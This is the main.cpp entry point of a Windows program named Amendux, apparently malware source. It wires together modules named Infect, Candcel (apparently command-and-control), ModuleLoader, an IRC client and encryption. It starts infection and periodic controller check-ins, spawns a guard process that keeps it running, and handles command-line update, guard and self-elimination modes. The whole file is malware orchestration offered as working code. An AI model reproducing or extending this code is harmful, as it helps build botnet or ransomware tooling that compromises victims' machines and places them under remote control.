//  Copyright (C) 2016 Amendux
//  All Rights Reserved.
//
//  UNIT: main.cpp 
//
//  PURPOSE: Operating system specific application initialization
//
//  COMMENTS:
//
//        Default to Win32-VC style
//        Use native Win32 datatypes
//
//  TODO: 
//
//        Remove all string literals
//        Help with CLI commands
//

#include "stdafx.h"
#include "Log.h"
#include "Encrypt.h"
#include "Config.h"
#include "Process.h"
#include "Candcel.h"
#include "Infect.h"
#include "ModuleLoader.h"
#include "Resource.h"

#if DEBUG
#include <sodium.h>
#endif

#define MAX_LOADSTRING  100
#define MUTEX           L"avcmtx"
#define WINUICLASS      L"AVCWIN32PROG" 

// Global Variables:
HINSTANCE hInst;                                // Current instance
HANDLE hMutex;									// Instance mutx lock

// Forward declarations of functions included in this code module:
ATOM                MainRegisterClass(HINSTANCE hInstance);
HWND				CreateStatusBar(HWND hwndParent, HMENU idStatus, HINSTANCE hinst, int cParts);
UINT_PTR			CreateTimer(HWND hwndParent, UINT_PTR nEvent, UINT uSec);
BOOL                InitInstance(HINSTANCE, int);
BOOL                CleanupInstance();
BOOL                ParseCommandLine();
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    Debug(HWND, UINT, WPARAM, LPARAM);
#include "IRCClient.h"
int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
	Amendux::IRCClient x;
	x.Run();
	// Parse commandline arguments
	if (!ParseCommandLine()) {
		return false;
	}

    // Perform application initialization
    if (!InitInstance(hInstance, nCmdShow)) {
        return false;
    }

	// Initialize instance
	Amendux::Log::Init();
	Amendux::Config::Init();

	// If anything failed at this moment, disengage
	if (!Amendux::Config::Success()) {
		PostQuitMessage(0);
	}

	// Run core classes
	Amendux::Infect::Init();
	Amendux::Candcel::Init();
	Amendux::ModuleLoader::Init();
	Amendux::Process::Guard();

	// Launch the threading processes
	Amendux::Candcel::SpawnInterval(Amendux::Candcel::Current());
	Amendux::Process::SpawnGuardProcess();

	// Main message loop
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

	// Terminate modules in reverse order
	Amendux::ModuleLoader::Terminate();
	Amendux::Candcel::Terminate();
	Amendux::Infect::Terminate();
	Amendux::Config::Terminate();
	Amendux::Log::Terminate();

	// Perform application cleanup
	if (!CleanupInstance()) {
		return false;
	}

    return (int)msg.wParam;
}


//
//  FUNCTION: DllMain()
//
//  PURPOSE: Entry point for dynamic loader.
//
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ulCall, LPVOID lpReserved)
{
	switch (ulCall) {
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}

	return TRUE;
}


//
//  FUNCTION: MainRegisterClass()
//
//  PURPOSE: Registers the window class
//
#if DEBUG
ATOM MainRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEX wcex;

    wcex.cbSize         = sizeof(WNDCLASSEX);
    wcex.style          = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
	wcex.hIcon          = 0;
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCE(MAIN_MENU);
    wcex.lpszClassName  = WINUICLASS;
    wcex.hIconSm        = 0;

	return RegisterClassEx(&wcex);
}
#endif


//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	// Store instance handle in our global variable
	hInst = hInstance;

	if (!Amendux::Config::Current()->CanGuardProcess()) {
		hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, MUTEX);

		if (hMutex) {
			return false;
		}

		// Prevent other instances
		hMutex = CreateMutex(0, 0, MUTEX);
	}

#if DEBUG

	// Main window
	MainRegisterClass(hInstance);

	HWND hWnd = CreateWindow(WINUICLASS, L"Amendux", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
	if (!hWnd) {
		ReleaseMutex(hMutex);
		return false;
	}

	// Set status bar
	CreateStatusBar(hWnd, (HMENU)IDC_MAIN_STATUS, hInstance, 1);

	// Set timer to 10 seconds
	CreateTimer(hWnd, IDC_TIMER, 10);

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

#endif // DEBUG

   // Drift random by planting the seed
   srand((unsigned int)time(NULL));

   return true;
}


//
//   FUNCTION: CleanupInstance()
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL CleanupInstance()
{
	ReleaseMutex(hMutex);

	return true;
}


//
//   FUNCTION: ParseCommandLine()
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL ParseCommandLine()
{
	LPWSTR *szArgList;
	int argCount;

	szArgList = CommandLineToArgvW(GetCommandLine(), &argCount);
	if (!szArgList || argCount < 1) {
		return false;
	}

	for (int i = 1; i < argCount; i++) {
		WCHAR *szCmd = szArgList[i];

#if DEBUG
		// Help info
		if (!wcscmp(szCmd, L"/?")) {
			LPCWSTR pszStr = L"Amendux [OPTION]\n\n"
				"/Nu <PID>\tRun update process\n"
				"/Sg <PID> \tSpawn guard process\n"
				"/EL\t\tEliminate instance\n"
				"/?\t\tHelp info\n"
				"\nMost options are only valid as child process\n";

			MessageBox(NULL, pszStr, L"Helper", MB_ICONINFORMATION);
			return false;
		}
#endif

		// Run update mode
		if ((!wcscmp(szCmd, L"/nu") || !wcscmp(szCmd, L"/NU") || !wcscmp(szCmd, L"/Nu") || !wcscmp(szCmd, L"/nU")) && argCount > 2) {
			unsigned int guardPid = Amendux::Config::Current()->GuardProcess();
			unsigned int pid = _wtoi(szArgList[i + 1]);
			if (pid < 1) {
				continue;
			}

			// Give the main module and guard some time to enter message loop
			Sleep(10 * 1000);
			
			Amendux::Process::EndProcess(guardPid, 10);

			// Give the main module some time to enter message loop
			Sleep(10 * 1000);

			Amendux::Config::Current()->SetMode(Amendux::OperationMode::UPDATE);
			Amendux::Process::EndProcess(pid, 10);

			// Give the main module some time to release mutex
			Sleep(10 * 1000);
			goto done;
		}

		// Spawn a guard
		if ((!wcscmp(szCmd, L"/sg") || !wcscmp(szCmd, L"/SG") || !wcscmp(szCmd, L"/Sg") || !wcscmp(szCmd, L"/sG")) && argCount > 2) {
			unsigned int pid = _wtoi(szArgList[i + 1]);
			if (pid < 1) {
				continue;
			}

			Amendux::Config::Current()->SetMode(Amendux::OperationMode::GUARD);
			Amendux::Config::Current()->SetGuardProcessId(pid);
			goto done;
		}

		// Run elimination mode
		if (!wcscmp(szCmd, L"/el") || !wcscmp(szCmd, L"/EL") || !wcscmp(szCmd, L"/El") || !wcscmp(szCmd, L"/eL")) {
			Amendux::Config::Current()->SetMode(Amendux::OperationMode::ELIMINATE);
			goto done;
		}

	}

done:
	LocalFree(szArgList);

	return true;
}


#if DEBUG
//
//  FUNCTION: CreateStatusBar(HWND, HMENU, HINSTANCE, int)
//
//  PURPOSE:  Creating status bar
//
//  WM_SIZE  - force status bar on bottom
//
//
HWND CreateStatusBar(HWND hwndParent, HMENU idStatus, HINSTANCE hinst, int cParts)
{
	RECT rcClient;

	// Ensure that the common control DLL is loaded.
	InitCommonControls();

	// Create the status bar.
	HWND hWndStatus = CreateWindowEx(0, STATUSCLASSNAME, (PCTSTR)NULL, WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP,
		0, 0, 0, 0,
		hwndParent,
		(HMENU)idStatus,
		hinst,
		NULL);

	if (!hWndStatus) {
		return hWndStatus;
	}

	// Get the coordinates of the parent window's client area.
	GetClientRect(hwndParent, &rcClient);

	// Allocate an array for holding the right edge coordinates.
	HLOCAL hloc = LocalAlloc(LHND, sizeof(int) * cParts);
	PINT paParts = (PINT)LocalLock(hloc);

	// Calculate the right edge coordinate for each part, and
	// copy the coordinates to the array.
	int nWidth = rcClient.right / cParts;
	int rightEdge = nWidth;
	for (int i = 0; i < cParts; i++) {
		paParts[i] = rightEdge;
		rightEdge += nWidth;
	}

	// Tell the status bar to create the window parts.
	SendMessage(hWndStatus, SB_SETPARTS, (WPARAM)cParts, (LPARAM)paParts);
	SendMessage(hWndStatus, SB_SETTEXT, 0, (LPARAM)L"Initializing...");
	
	// Free the array, and return.
	LocalUnlock(hloc);
	LocalFree(hloc);
	return hWndStatus;
}


//
//  FUNCTION: CreateTimer(HWND hwndParent, UINT_PTR nEvent, UINT uSec)
//
//  PURPOSE:  Set the timer
//
//
UINT_PTR CreateTimer(HWND hwndParent, UINT_PTR nEvent, UINT uSec)
{
	return SetTimer(hwndParent, IDC_TIMER, uSec * 1000, NULL);
}


//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:  Processes messages for the main window
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message) {
		case WM_COMMAND: {
				switch (LOWORD(wParam)) {
					case MENU_ABOUT:
						DialogBox(hInst, MAKEINTRESOURCE(DIALOG_ABOUT), hWnd, About);
						break;
					case MENU_MOD_ENCRYPT:
						// FileCrypt.Run();
						break;
					case MENU_FILE_DEBUG:
						DialogBox(hInst, MAKEINTRESOURCE(DIALOG_DEBUG_LOG), hWnd, Debug);
						break;
					case MENU_FILE_KILLGUARD: {
							unsigned int pid = Amendux::Config::Current()->GuardProcess();
							Amendux::Process::EndProcess(pid);
						}
						break;
					case MENU_EXIT: {
							unsigned int pid = Amendux::Config::Current()->GuardProcess();
							Amendux::Process::EndProcess(pid);
							DestroyWindow(hWnd);
						}
						break;
					default:
						return DefWindowProc(hWnd, message, wParam, lParam);
				}
			}
			break;

		case WM_PAINT: {
				PAINTSTRUCT ps;
				HDC hdc = BeginPaint(hWnd, &ps);
				
				EndPaint(hWnd, &ps);

				std::wstring status = L"Running... [DEBUG]";
				std::wstring tile = L"Amendux (" + Amendux::Config::Current()->DisplayName() + L") [DEBUG]";

				status += L"[" + Amendux::Config::Current()->ModeName() + L"]";
				tile += L"[" + Amendux::Config::Current()->ModeName() + L"]";

				SetWindowText(hWnd, tile.c_str());

				if (Amendux::Candcel::Current()->IsConnected()) {
					status += L"[CONNECTED][CHECKIN:" + std::to_wstring(Amendux::Candcel::Current()->CheckinCounter()) + L"]";
					status += L"[GUARDED]";//TODO
				}

				SendDlgItemMessage(hWnd, IDC_MAIN_STATUS, SB_SETTEXT, 0, (LPARAM)status.c_str());
			}
			break;

		case WM_TIMER:
			RedrawWindow(hWnd, NULL, NULL, RDW_INVALIDATE | RDW_INTERNALPAINT);

		case WM_SIZE:
			SendDlgItemMessage(hWnd, IDC_MAIN_STATUS, WM_SIZE, 0, 0);
			break;

		case WM_GETMINMAXINFO: {
				MINMAXINFO* mmi = (MINMAXINFO*)lParam;
				mmi->ptMinTrackSize.x = 750;
				mmi->ptMinTrackSize.y = 450;
			}
			break;

		case WM_DESTROY:
			PostQuitMessage(0);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
    }

	return 0;
}


//
//  FUNCTION: About(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:   Message handler for about box
//
//
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);

	switch (message) {
		case WM_INITDIALOG:
			SetDlgItemText(hDlg, IDC_STATIC_VERSION, (L"Amendux, Version " + Amendux::Config::getVersion()).c_str());
			SetDlgItemText(hDlg, IDC_STATIC_SODIUM, L"libsodium " SODIUM_VERSION_STRING);

			return (INT_PTR)TRUE;

		case WM_COMMAND:
			if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) {
				EndDialog(hDlg, LOWORD(wParam));
				return (INT_PTR)TRUE;
			}
			break;
    }

	return (INT_PTR)FALSE;
}


//
//  FUNCTION: Debug(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:   Message handler for debug message viewer.
//
//
INT_PTR CALLBACK Debug(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);

	switch (message) {
		case WM_INITDIALOG:
			SetDlgItemText(hDlg, IDC_DEBUG_CONSOLE, Amendux::Log::Readback().c_str());
			return (INT_PTR)TRUE;

		case WM_COMMAND:
			if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) {
				EndDialog(hDlg, LOWORD(wParam));
				return (INT_PTR)TRUE;
			} else if (LOWORD(wParam) == BTN_REFRESH) {
				SetDlgItemText(hDlg, IDC_DEBUG_CONSOLE, Amendux::Log::Readback().c_str());
			}

			break;
	}

	return (INT_PTR)FALSE;
}
#endif // DEBUG

// Check if builder is run
static_assert(ISBUILD, "Run the builder first");
